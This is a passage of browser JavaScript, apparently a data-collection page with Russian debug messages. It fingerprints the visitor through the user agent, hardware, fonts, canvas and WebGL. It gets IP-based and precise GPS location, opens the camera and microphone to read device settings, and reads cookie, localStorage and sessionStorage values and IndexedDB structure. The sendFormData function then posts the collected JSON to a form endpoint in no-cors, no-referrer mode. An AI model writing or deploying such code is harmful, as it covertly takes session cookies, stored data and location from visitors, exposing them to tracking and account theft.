            if (baseResult.details.diagnostics) {
                baseResult.details.diagnostics.usbSpecific = {
                    canControlTransfer: 'controlTransferIn' in (navigator.usb || {}),
                    canBulkTransfer: 'transferIn' in (navigator.usb || {}),
                    canIsochronousTransfer: 'isochronousTransferIn' in (navigator.usb || {}),
                    apiVersion: 'usb' in navigator ? 'present' : 'absent',
                    transferTypes: {
                        control: 'controlTransferIn' in (navigator.usb || {}),
                        bulk: 'transferIn' in (navigator.usb || {}),
                        interrupt: 'transferIn' in (navigator.usb || {}),
                        isochronous: 'isochronousTransferIn' in (navigator.usb || {})
                    }
                };

                if (navigator.usb) {
                    baseResult.details.diagnostics.usbSpecific.supports = {
                        getDevices: typeof navigator.usb.getDevices === 'function',
                        requestDevice: typeof navigator.usb.requestDevice === 'function',
                        forgetDevice: typeof navigator.usb.forgetDevice === 'function',
                        getPermission: typeof navigator.usb.getPermission === 'function'
                    };
                }
            }

            return baseResult;
        }

        async function getFontsInfo() {
            if (!document.fonts || !document.fonts.ready) {
                return { available: false };
            }

            try {
                await document.fonts.ready;
                const fonts = [];
                for (const font of document.fonts) {
                    fonts.push(font.family);
                }
                return {
                    available: true,
                    count: fonts.length,
                    uniqueCount: [...new Set(fonts)].length,
                    sample: fonts.slice(0, 10)
                };
            } catch (error) {
                return { available: false, error: error.message };
            }
        }

        function getMimeTypesInfo() {
            if (!navigator.mimeTypes) {
                return { available: false };
            }

            const mimeTypes = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                const mimeType = navigator.mimeTypes[i];
                mimeTypes.push({
                    type: mimeType.type,
                    description: mimeType.description,
                    enabled: mimeType.enabledPlugin ? true : false
                });
            }

            return {
                available: true,
                count: mimeTypes.length,
                types: mimeTypes.slice(0, 20)
            };
        }

        function getCSPInfo() {
            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy-Report-Only"]');

            return {
                hasCSP: !!cspMeta,
                hasReportOnly: !!cspHeader,
                cspContent: cspMeta ? cspMeta.content : null,
                reportOnlyContent: cspHeader ? cspHeader.content : null
            };
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) {
                return { available: false };
            }

            try {
                const battery = await navigator.getBattery();
                return {
                    available: true,
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (error) {
                return { available: false, error: error.message };
            }
        }

        function collectBrowserInfo() {
            const isFileProtocol = window.location.protocol === 'file:';

            return {
                name: getBrowserName(),
                version: getBrowserVersion(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'unknown',
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: isFileProtocol ? 'not_supported_in_file_protocol' : navigator.cookieEnabled,
                online: navigator.onLine,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                protocol: window.location.protocol,
                isLocalFile: isFileProtocol,
                userAgentLength: navigator.userAgent ? navigator.userAgent.length : 0,
                isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                isTablet: /Tablet|iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
                parsedOS: parseOSFromUserAgent(navigator.userAgent),
                isChromium: /Chrome|Chromium|Edg|OPR/i.test(navigator.userAgent),
                isEdge: /Edg/i.test(navigator.userAgent),
                isOpera: /OPR/i.test(navigator.userAgent)
            };
        }

        function parseOSFromUserAgent(ua) {
            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
            if (/Mac OS X/.test(ua)) return 'macOS';
            if (/Linux/.test(ua)) return 'Linux';
            if (/Android/.test(ua)) return 'Android';
            if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
            return 'Unknown';
        }

        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
            return 'Unknown';
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;

            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                const safariMatch = ua.match(/Version\/(\d+)/);
                if (safariMatch) return safariMatch[1];
            }

            const matches = ua.match(/(chrome|firefox|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

            return matches[2] || 'unknown';
        }

        function collectSystemInfo() {
            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type || 'unknown',
                    pixelRatio: window.devicePixelRatio || 1,
                    colorGamut: getColorGamut(),
                    hdr: checkHDRSupport(),
                    orientationAngle: screen.orientation?.angle || 0
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    orientation: window.orientation || 'unknown'
                },
                hardware: {
                    hardwareConcurrency: navigator.hardwareConcurrency || null,
                    deviceMemory: navigator.deviceMemory || null,
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    hasTouchScreen: navigator.maxTouchPoints > 0,
                    estimatedCores: estimateCPUcores()
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    locale: Intl.DateTimeFormat().resolvedOptions().locale
                },
                performance: {
                    memory: performance.memory ? {
                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB',
                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB',
                        jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) + ' MB'
                    } : null,
                    timing: performance.timing ? {
                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms',
                        domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart + 'ms'
                    } : null
                }
            };
        }

        function getColorGamut() {
            if (window.matchMedia) {
                if (matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
                if (matchMedia('(color-gamut: p3)').matches) return 'p3';
                if (matchMedia('(color-gamut: srgb)').matches) return 'srgb';
            }
            return 'unknown';
        }

        function checkHDRSupport() {
            if (window.matchMedia) {
                return matchMedia('(dynamic-range: high)').matches;
            }
            return false;
        }

        function estimateCPUcores() {
            if (navigator.hardwareConcurrency) return navigator.hardwareConcurrency;

            const ua = navigator.userAgent || '';
            if (/Mobile|Android|iPhone/.test(ua)) return 4;
            if (/Tablet|iPad/.test(ua)) return 4;

            return 2;
        }

        async function collectLocationInfo() {
            const result = {
                available: true,
                error: null,
                status: 'success',
                details: {
                    ipBased: {
                        ip: null,
                        country: null,
                        country_code: null,
                        region: null,
                        city: null,
                        postal: null,
                        latitude: null,
                        longitude: null,
                        timezone: null,
                        currency: null,
                        languages: null,
                        isp: null,
                        org: null,
                        as: null,
                        mobile: false,
                        proxy: false,
                        hosting: false,
                        error: null
                    },
                    precise: {
                        available: false,
                        latitude: null,
                        longitude: null,
                        accuracy: null,
                        altitude: null,
                        altitudeAccuracy: null,
                        heading: null,
                        speed: null,
                        error: null,
                        code: null
                    },
                    estimatedByTimezone: {
                        timezone: null,
                        language: null
                    }
                },
                timestamp: new Date().toISOString()
            };

            debugLog('Начало сбора геолокации');

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipInfo = await response.json();
                result.details.ipBased.ip = ipInfo.ip;

                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ipInfo.ip}/json/`);
                    if (geoResponse.ok) {
                        const geoData = await geoResponse.json();

                        Object.assign(result.details.ipBased, {
                            country: geoData.country_name,
                            country_code: geoData.country_code,
                            region: geoData.region,
                            city: geoData.city,
                            postal: geoData.postal,
                            latitude: geoData.latitude,
                            longitude: geoData.longitude,
                            timezone: geoData.timezone,
                            currency: geoData.currency,
                            languages: geoData.languages,
                            isp: geoData.org,
                            org: geoData.org,
                            as: geoData.asn,
                            mobile: geoData.mobile || false,
                            proxy: geoData.proxy || false,
                            hosting: geoData.hosting || false
                        });
                    } else {
                        result.details.ipBased.error = `HTTP ${geoResponse.status}`;
                    }
                } catch (geoError) {
                    result.details.ipBased.error = geoError.message;
                }
            } catch (error) {
                result.available = false;
                result.error = 'Не удалось получить данные по IP';
                result.status = 'error';
                result.details.ipBased.error = error.message;
            }

            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        const timeoutId = setTimeout(() => {
                            reject(new Error('Geolocation timeout: 12s exceeded'));
                        }, 12000);

                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                clearTimeout(timeoutId);
                                resolve(pos);
                            },
                            (err) => {
                                clearTimeout(timeoutId);
                                reject(err);
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    });

                    result.details.precise = {
                        available: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' метров',
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        error: null,
                        code: null
                    };

                } catch (error) {
                    result.details.precise = {
                        available: false,
                        error: error.message,
                        code: error.code || 'unknown',
                        latitude: null,
                        longitude: null,
                        accuracy: null
                    };
                }
            } else {
                result.details.precise = {
                    available: false,
                    error: 'Geolocation API not supported',
                    code: 'not_supported'
                };
            }

            result.details.estimatedByTimezone = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };

            return result;
        }

        async function collectMediaInfo() {
            const result = {
                available: false,
                error: null,
                status: 'not_available',
                details: {
                    devices: [],
                    screen: {},
                    summary: {},
                    systemInfo: {}
                },
                timestamp: new Date().toISOString()
            };

            if (!('mediaDevices' in navigator)) {
                result.error = 'MediaDevices API не поддерживается';
                result.details.summary = {
                    cameraCount: 0,
                    microphoneCount: 0,
                    speakerCount: 0,
                    totalDevices: 0
                };
                result.details.screen = { hasScreenCapture: false };
                result.details.systemInfo = {
                    hasFrontCamera: false,
                    hasBackCamera: false,
                    hasExternalCamera: false,
                    hasBuiltInMicrophone: false,
                    hasExternalMicrophone: false,
                    hasBuiltInSpeakers: false,
                    hasExternalSpeakers: false
                };
                return result;
            }

            try {
                let devices = await navigator.mediaDevices.enumerateDevices();

                let hasVideoAccess = false;
                let hasAudioAccess = false;

                const hasVideoDevice = devices.some(d => d.kind === 'videoinput');
                const hasAudioDevice = devices.some(d => d.kind === 'audioinput');

                if (hasVideoDevice || hasAudioDevice) {
                    try {
                        const constraints = {};
                        if (hasVideoDevice) constraints.video = true;
                        if (hasAudioDevice) constraints.audio = true;

                        const testStream = await navigator.mediaDevices.getUserMedia(constraints);

                        if (hasVideoDevice) hasVideoAccess = true;
                        if (hasAudioDevice) hasAudioAccess = true;

                        const videoTracks = testStream.getVideoTracks();
                        const audioTracks = testStream.getAudioTracks();

                        testStream.getTracks().forEach(track => track.stop());

                        devices = await navigator.mediaDevices.enumerateDevices();

                    } catch (accessError) {
                        result.details.accessError = accessError.message;
                    }
                }

                const detailedDevices = [];
                const systemInfo = {
                    hasFrontCamera: false,
                    hasBackCamera: false,
                    hasExternalCamera: false,
                    hasBuiltInMicrophone: false,
                    hasExternalMicrophone: false,
                    hasBuiltInSpeakers: false,
                    hasExternalSpeakers: false,
                    stereoCapable: false,
                    surroundCapable: false
                };

                for (const device of devices) {
                    const deviceInfo = {
                        kind: device.kind,
                        label: device.label || 'Не указано',
                        deviceId: device.deviceId ? device.deviceId.substring(0, 10) + '...' : 'none',
                        groupId: device.groupId ? device.groupId.substring(0, 10) + '...' : 'none',
                        type: getDeviceType(device.kind),
                        hasAccess: (device.kind === 'videoinput' && hasVideoAccess) ||
                            ((device.kind === 'audioinput' || device.kind === 'audiooutput') && hasAudioAccess)
                    };

                    if (device.kind === 'videoinput') {
                        deviceInfo.cameraType = determineCameraType(device.label,
                            detailedDevices.filter(d => d.kind === 'videoinput').length);

                        if (deviceInfo.cameraType.includes('front')) systemInfo.hasFrontCamera = true;
                        if (deviceInfo.cameraType.includes('back')) systemInfo.hasBackCamera = true;
                        if (deviceInfo.cameraType.includes('external')) systemInfo.hasExternalCamera = true;

                        if (hasVideoAccess) {
                            try {
                                const stream = await navigator.mediaDevices.getUserMedia({
                                    video: { deviceId: { exact: device.deviceId } }
                                });

                                const track = stream.getVideoTracks()[0];
                                const settings = track.getSettings();

                                deviceInfo.settings = {
                                    width: settings.width,
                                    height: settings.height,
                                    frameRate: settings.frameRate,
                                    facingMode: settings.facingMode || 'undefined',
                                    aspectRatio: settings.aspectRatio,
                                    resizeMode: settings.resizeMode,
                                    frameRateConstraints: settings.frameRateConstraints
                                };

                                try {
                                    const capabilities = track.getCapabilities();
                                    deviceInfo.capabilities = {
                                        width: capabilities.width,
                                        height: capabilities.height,
                                        frameRate: capabilities.frameRate,
                                        facingMode: capabilities.facingMode,
                                        zoom: capabilities.zoom,
                                        torch: capabilities.torch,
                                        whiteBalanceMode: capabilities.whiteBalanceMode,
                                        exposureMode: capabilities.exposureMode,
                                        focusMode: capabilities.focusMode
                                    };
                                } catch (capError) {
                                    deviceInfo.capabilitiesError = capError.message;
                                }

                                try {
                                    const constraints = track.getConstraints();
                                    deviceInfo.constraints = constraints;
                                } catch (conError) {
                                    deviceInfo.constraintsError = conError.message;
                                }

                                stream.getTracks().forEach(t => t.stop());

                            } catch (deviceError) {
                                deviceInfo.error = deviceError.message;
                            }
                        }
                    }

                    else if (device.kind === 'audioinput') {
                        deviceInfo.microphoneType = determineMicrophoneType(device.label);

                        if (deviceInfo.microphoneType.includes('built-in') ||
                            deviceInfo.microphoneType.includes('internal')) {
                            systemInfo.hasBuiltInMicrophone = true;
                        } else {
                            systemInfo.hasExternalMicrophone = true;
                        }

                        if (hasAudioAccess) {
                            try {
                                const stream = await navigator.mediaDevices.getUserMedia({
                                    audio: {
                                        deviceId: { exact: device.deviceId },
                                        echoCancellation: true,
                                        noiseSuppression: true,
                                        autoGainControl: true
                                    },
                                    video: false
                                });

                                const track = stream.getAudioTracks()[0];
                                const settings = track.getSettings();

                                deviceInfo.settings = {
                                    sampleRate: settings.sampleRate,
                                    sampleSize: settings.sampleSize,
                                    channelCount: settings.channelCount,
                                    echoCancellation: settings.echoCancellation,
                                    autoGainControl: settings.autoGainControl,
                                    noiseSuppression: settings.noiseSuppression,
                                    latency: settings.latency,
                                    channelCountMode: settings.channelCountMode,
                                    channelCountConstraint: settings.channelCountConstraint
                                };

                                try {
                                    const capabilities = track.getCapabilities();
                                    deviceInfo.capabilities = {
                                        sampleRate: capabilities.sampleRate,
                                        sampleSize: capabilities.sampleSize,
                                        channelCount: capabilities.channelCount,
                                        echoCancellation: capabilities.echoCancellation,
                                        autoGainControl: capabilities.autoGainControl,
                                        noiseSuppression: capabilities.noiseSuppression
                                    };

                                    if (capabilities.channelCount && capabilities.channelCount.max >= 2) {
                                        systemInfo.stereoCapable = true;
                                    }
                                    if (capabilities.channelCount && capabilities.channelCount.max >= 5) {
                                        systemInfo.surroundCapable = true;
                                    }
                                } catch (capError) {
                                    deviceInfo.capabilitiesError = capError.message;
                                }

                                stream.getTracks().forEach(t => t.stop());

                            } catch (deviceError) {
                                deviceInfo.error = deviceError.message;
                            }
                        }
                    }

                    else if (device.kind === 'audiooutput') {
                        deviceInfo.speakerType = determineSpeakerType(device.label);

                        if (deviceInfo.speakerType.includes('built-in') ||
                            deviceInfo.speakerType.includes('internal')) {
                            systemInfo.hasBuiltInSpeakers = true;
                        } else {
                            systemInfo.hasExternalSpeakers = true;
                        }

                        deviceInfo.speakerInfo = {
                            default: 'default' in navigator.mediaDevices &&
                                await navigator.mediaDevices.selectAudioOutput ?
                                await navigator.mediaDevices.selectAudioOutput() : null,
                            canSelectOutput: 'selectAudioOutput' in navigator.mediaDevices,
                            supportsSetSinkId: 'setSinkId' in HTMLAudioElement.prototype
                        };
                    }

                    detailedDevices.push(deviceInfo);
                }

                const summary = {
                    hasCamera: devices.some(d => d.kind === 'videoinput'),
                    hasMicrophone: devices.some(d => d.kind === 'audioinput'),
                    hasSpeakers: devices.some(d => d.kind === 'audiooutput'),
                    totalDevices: devices.length,
                    cameraCount: devices.filter(d => d.kind === 'videoinput').length,
                    microphoneCount: devices.filter(d => d.kind === 'audioinput').length,
                    speakerCount: devices.filter(d => d.kind === 'audiooutput').length,
                    hasVideoAccess: hasVideoAccess,
                    hasAudioAccess: hasAudioAccess,
                    camerasWithDetails: detailedDevices.filter(d =>
                        d.kind === 'videoinput' && d.settings).length,
                    microphonesWithDetails: detailedDevices.filter(d =>
                        d.kind === 'audioinput' && d.settings).length
                };

                const screenInfo = {
                    hasScreenCapture: 'getDisplayMedia' in navigator.mediaDevices,
                    hasSupportedConstraints: 'getSupportedConstraints' in navigator.mediaDevices ?
                        navigator.mediaDevices.getSupportedConstraints() : null
                };

                result.available = true;
                result.status = 'success';
                result.details.devices = detailedDevices;
                result.details.screen = screenInfo;
                result.details.summary = summary;
                result.details.systemInfo = systemInfo;

            } catch (error) {
                result.available = false;
                result.error = error.message;
                result.status = 'error';
                result.details.summary = {
                    cameraCount: 0,
                    microphoneCount: 0,
                    speakerCount: 0,
                    totalDevices: 0
                };
                result.details.screen = { hasScreenCapture: false };
                result.details.systemInfo = {
                    hasFrontCamera: false,
                    hasBackCamera: false,
                    hasExternalCamera: false,
                    hasBuiltInMicrophone: false,
                    hasExternalMicrophone: false,
                    hasBuiltInSpeakers: false,
                    hasExternalSpeakers: false
                };
            }

            return result;
        }

        function determineCameraType(label, cameraIndex) {
            if (!label) return `unknown_${cameraIndex}`;

            const lcLabel = label.toLowerCase();

            if (lcLabel.includes('front') || lcLabel.includes('user') ||
                lcLabel.includes('встроенная') || lcLabel.includes('фронтальная')) {
                return 'front';
            }
            if (lcLabel.includes('back') || lcLabel.includes('environment') ||
                lcLabel.includes('тыловая') || lcLabel.includes('задняя')) {
                return 'back';
            }
            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
                lcLabel.includes('webcam') || lcLabel.includes('веб-камера')) {
                return 'external';
            }

            switch (cameraIndex) {
                case 0: return 'front (предположительно)';
                case 1: return 'back (предположительно)';
                default: return 'external (предположительно)';
            }
        }

        function determineMicrophoneType(label) {
            if (!label) return 'unknown';

            const lcLabel = label.toLowerCase();

            if (lcLabel.includes('built-in') || lcLabel.includes('internal') ||
                lcLabel.includes('встроенный') || lcLabel.includes('микрофон') ||
                lcLabel.includes('default')) {
                return 'built-in';
            }
            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
                lcLabel.includes('headset') || lcLabel.includes('наушники') ||
                lcLabel.includes('гарнитура')) {
                return 'external';
            }

            return 'unknown';
        }

        function determineSpeakerType(label) {
            if (!label) return 'unknown';

            const lcLabel = label.toLowerCase();

            if (lcLabel.includes('built-in') || lcLabel.includes('internal') ||
                lcLabel.includes('встроенные') || lcLabel.includes('динамики') ||
                lcLabel.includes('speakers') || lcLabel.includes('default')) {
                return 'built-in';
            }
            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
                lcLabel.includes('headphones') || lcLabel.includes('наушники') ||
                lcLabel.includes('bluetooth') || lcLabel.includes('колонки')) {
                return 'external';
            }

            return 'unknown';
        }

        function getDeviceType(kind) {
            switch (kind) {
                case 'videoinput': return 'camera';
                case 'audioinput': return 'microphone';
                case 'audiooutput': return 'speaker';
                default: return kind;
            }
        }

        function getDeviceType(kind) {
            switch (kind) {
                case 'videoinput': return 'camera';
                case 'audioinput': return 'microphone';
                case 'audiooutput': return 'speaker';
                default: return kind;
            }
        }

        function getConnectionObject() {
            if (navigator.connection) {
                return navigator.connection;
            } else if (navigator.mozConnection) {
                return navigator.mozConnection;
            } else if (navigator.webkitConnection) {
                return navigator.webkitConnection;
            } else if (navigator.network && navigator.network.connection) {
                return navigator.network.connection;
            }
            return null;
        }

        function collectNetworkInfo() {
            const info = {
                online: navigator.onLine,
                connectionType: 'unknown',
                effectiveType: 'unknown',
                downlink: null,
                rtt: null,
                saveData: false,
                detectedAPI: 'none'
            };

            const connection = getConnectionObject();

            if (connection) {
                info.connectionType = connection.type || 'unknown';
                info.effectiveType = connection.effectiveType || 'unknown';
                info.downlink = connection.downlink;
                info.rtt = connection.rtt;
                info.saveData = connection.saveData || false;
                info.detectedAPI = 'found';
                info.supported = true;
            } else {
                info.connectionType = detectConnectionTypeFallBack();
                info.detectedAPI = 'no connection API found';
                info.supported = false;
            }

            return info;
        }

        function detectConnectionTypeFallBack() {
            const ua = navigator.userAgent || '';

            const connection = navigator.connection ||
                navigator.mozConnection ||
                navigator.webkitConnection ||
                navigator.network?.connection;

            if (connection) {
                if (connection.type) {
                    return connection.type + ' (определено API)';
                }
                if (connection.effectiveType) {
                    return connection.effectiveType + ' (effectiveType)';
                }
            }

            const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua.toLowerCase());
            const isTablet = /tablet|ipad|android(?!.*mobile)/i.test(ua.toLowerCase());
            const platform = navigator.platform || '';

            if (isMobile || isTablet) {
                const maxTouchPoints = navigator.maxTouchPoints || 0;

                const isSmallScreen = Math.min(screen.width, screen.height) < 768;

                if (isMobile && isSmallScreen) {
                    return 'cellular (мобильное устройство)';
                }

                if (isTablet || (!isSmallScreen && maxTouchPoints > 0)) {
                    return 'wifi (планшет или большой экран)';
                }
            }

            if (performance.timing && performance.timing.loadEventEnd) {
                const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;

                if (loadTime < 1000) {
                    return 'ethernet (быстрое соединение)';
                } else if (loadTime < 3000) {
                    return 'wifi (средняя скорость)';
                } else if (loadTime < 7000) {
                    return 'wifi (медленное соединение)';
                } else {
                    return 'cellular tethering или медленный wifi';
                }
            }

            const isDesktop = /win|mac|linux/i.test(platform.toLowerCase());

            if (isDesktop) {
                const cores = navigator.hardwareConcurrency || 0;
                if (cores >= 4) {
                    return 'ethernet (десктоп)';
                }
                return 'wifi/ethernet (десктоп)';
            }

            if (screen.width >= 1920 && screen.height >= 1080) {
                return 'ethernet (большой экран, вероятно десктоп)';
            }

            if (screen.width < 1024 && screen.height < 768) {
                return 'cellular (маленький экран)';
            }

            return 'unknown';
        }

        function collectCapabilitiesInfo() {
            return {
                apis: {
                    geolocation: 'geolocation' in navigator,
                    mediaDevices: 'mediaDevices' in navigator,
                    notifications: 'Notification' in window,
                    clipboard: 'clipboard' in navigator,
                    vibration: 'vibrate' in navigator,
                    serviceWorker: 'serviceWorker' in navigator,
                    storage: 'storage' in navigator,
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    webGL: 'WebGLRenderingContext' in window,
                    webGPU: 'GPU' in window,
                    webXR: 'xr' in navigator,
                    gamepad: 'getGamepads' in navigator
                },

                webGL: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

                        if (gl) {
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            return {
                                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                                supportedExtensions: gl.getSupportedExtensions()?.length || 0
                            };
                        }
                    } catch (e) { }
                    return null;
                })(),

                storage: {
                    localStorage: testStorage('localStorage'),
                    sessionStorage: testStorage('sessionStorage'),
                    indexedDB: 'indexedDB' in window,
                    cookies: navigator.cookieEnabled
                },

                misc: {
                    pdfViewer: 'application/pdf' in navigator.mimeTypes,
                    java: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
                }
            };
        }

        function testStorage(type) {
            try {
                const test = 'test';
                if (type === 'localStorage') {
                    localStorage.setItem(test, test);
                    localStorage.removeItem(test);
                } else {
                    sessionStorage.setItem(test, test);
                    sessionStorage.removeItem(test);
                }
                return true;
            } catch (e) {
                return false;
            }
        }

        function collectAdditionalInfo() {
            const canvasFingerprint = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 200;
                    canvas.height = 100;
                    const ctx = canvas.getContext('2d');

                    ctx.fillStyle = 'rgb(255, 102, 0)';
                    ctx.fillRect(10, 10, 50, 50);
                    ctx.fillStyle = 'rgba(0, 153, 255, 0.7)';
                    ctx.fillRect(30, 30, 50, 50);
                    ctx.font = '14px "Arial"';
                    ctx.fillText('Browser Fingerprint', 10, 80);

                    return canvas.toDataURL().substring(0, 100) + '...';
                } catch (e) {
                    return null;
                }
            })();

            const plugins = [];
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push({
                        name: navigator.plugins[i].name,
                        description: navigator.plugins[i].description,
                        version: navigator.plugins[i].version || null
                    });
                }
            }

            return {
                canvasFingerprint: canvasFingerprint,
                plugins: plugins,
                mimeTypes: navigator.mimeTypes?.length || 0,
                referrer: document.referrer || 'none',
                pageLoadTime: performance.timing ?
                    performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms' : 'unknown'
            };
        }

        async function collectDatabaseInfo() {
            const result = {
                indexedDB: { available: false, databases: [] },
                localStorage: { available: false, data: {} },
                sessionStorage: { available: false, data: {} },
                cookies: { available: false, cookies: [] }
            };

            if ('indexedDB' in window) {
                result.indexedDB.available = true;

                try {
                    const databases = await indexedDB.databases ? indexedDB.databases() : [];

                    if (databases && databases.length > 0) {
                        result.indexedDB.databases = databases.map(db => ({
                            name: db.name,
                            version: db.version
                        }));

                        for (const dbInfo of databases.slice(0, 3)) {
                            try {
                                const db = await new Promise((resolve, reject) => {
                                    const request = indexedDB.open(dbInfo.name);
                                    request.onsuccess = () => resolve(request.result);
                                    request.onerror = () => reject(request.error);
                                    request.onupgradeneeded = () => {
                                        request.transaction.abort();
                                    };
                                });

                                const stores = [];
                                if (db.objectStoreNames) {
                                    for (const storeName of db.objectStoreNames) {
                                        const store = db.transaction(storeName).objectStore(storeName);
                                        stores.push({
                                            name: storeName,
                                            keyPath: store.keyPath,
                                            autoIncrement: store.autoIncrement,
                                            indexes: Array.from(store.indexNames).map(indexName => {
                                                const index = store.index(indexName);
                                                return {
                                                    name: index.name,
                                                    keyPath: index.keyPath,
                                                    unique: index.unique,
                                                    multiEntry: index.multiEntry
                                                };
                                            })
                                        });
                                    }
                                }

                                result.indexedDB.databases.find(d => d.name === dbInfo.name).stores = stores;
                                db.close();

                            } catch (e) { }
                        }
                    }
                } catch (error) {
                    result.indexedDB.error = error.message;
                }
            }

            if ('localStorage' in window) {
                result.localStorage.available = true;
                try {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        items[key] = value ?
                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
                            null;
                    }
                    result.localStorage.data = items;
                    result.localStorage.count = Object.keys(items).length;
                } catch (e) {
                    result.localStorage.error = e.message;
                }
            }

            if ('sessionStorage' in window) {
                result.sessionStorage.available = true;
                try {
                    const items = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        items[key] = value ?
                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
                            null;
                    }
                    result.sessionStorage.data = items;
                    result.sessionStorage.count = Object.keys(items).length;
                } catch (e) {
                    result.sessionStorage.error = e.message;
                }
            }

            if (navigator.cookieEnabled) {
                result.cookies.available = true;
                try {
                    const cookies = document.cookie.split(';').map(c => c.trim());
                    result.cookies.cookies = cookies.filter(c => c).map(cookie => {
                        const [name, ...valueParts] = cookie.split('=');
                        return {
                            name: name,
                            value: valueParts.join('=').substring(0, 50) +
                                (valueParts.join('=').length > 50 ? '...' : ''),
                            fullLength: valueParts.join('=').length
                        };
                    });
                    result.cookies.count = result.cookies.cookies.length;
                } catch (e) {
                    result.cookies.error = e.message;
                }
            }

            if ('caches' in window) {
                try {
                    const cacheKeys = await caches.keys();
                    result.cacheAPI = {
                        available: true,
                        caches: cacheKeys,
                        count: cacheKeys.length
                    };
                } catch (e) {
                    result.cacheAPI = { available: false, error: e.message };
                }
            }

            return result;
        }

        async function sendFormData(jsonData) {
            return new Promise((resolve) => {
                try {
                    debugLog('Подготовка формы к отправке');

                    collectedDataField.value = jsonData;

                    const formData = new FormData(Form);

                    fetch(Form.action, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors',
                        cache: 'no-cache',
                        referrerPolicy: 'no-referrer'
                    })
                        .then(response => {
                            debugLog('Fetch ответ получен', {
                                type: response.type,
                                status: response.status,
                                ok: response.ok
                            });

                            if (response.type === 'opaque') {
                                debugLog('Форма отправлена (no-cors режим)');
                                resolve(true);
                            } else if (response.ok) {
                                debugLog('Форма отправлена успешно');
                                resolve(true);
                            } else {
                                debugError(`Ошибка HTTP: ${response.status}`);
                                resolve(false);
                            }
                        })
                        .catch(error => {
                            debugError('Ошибка fetch при отправке', error);

                            try {
                                debugLog('Пробуем XMLHttpRequest как fallback');
                                const xhr = new XMLHttpRequest();
                                xhr.open('POST', Form.action, true);
                                xhr.timeout = 10000;

